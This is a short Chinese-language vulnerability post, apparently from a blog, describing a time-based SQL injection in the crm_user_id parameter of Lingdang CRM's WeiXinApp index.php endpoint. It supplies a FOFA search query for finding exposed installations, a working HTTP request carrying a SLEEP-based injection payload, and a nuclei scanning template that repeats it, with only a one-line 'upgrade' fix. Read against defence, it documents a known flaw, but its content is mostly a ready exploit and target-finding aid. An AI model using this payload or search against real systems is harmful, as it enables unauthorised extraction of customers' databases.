@[toc]
## 免责申明
本文章仅供学习与交流，请勿用于非法用途，均由使用者本人负责，文章作者不为此承担任何责任
## 漏洞描述
灵当CRM系统是一款功能全面、易于使用的客户关系管理（CRM）软件，由上海灵当信息科技有限公司开发。该系统专为以销售和服务业务为主的中小型企业设计，旨在帮助这些企业实现销售、服务、财务等一体化管理，提升整体运营效率，在index.php接口存在sql注入漏洞，通过延时注入可以获取数据库的数据

## 搜索语法
fofa
```
body="crmcommon/js/jquery/jquery-1.10.1.min.js"
```
## 漏洞复现
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1ea543388e3342b2b0c38eeb3afb76a4.png)
payload
```
GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(2)))x) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36

```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/3fdf32f793ec40e19d00cd8c1a8716a5.png)

## nuclei
```yaml
id: template-id

info:
  name: Template Name
  author: '30842'
  severity: info
  description: description
  reference:
    - https://
  tags: tags

http:
  - raw:
      - |+
        GET /crm/WeiXinApp/marketing/index.php?module=WxOrder&action=getOrderList&crm_user_id=1%20AND%20(SELECT%209552%20FROM%20(SELECT(SLEEP(2)))x) HTTP/1.1
        Host:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - code
      - type: status
        status:
          - 200
```

## 修复建议
升级到最新版本
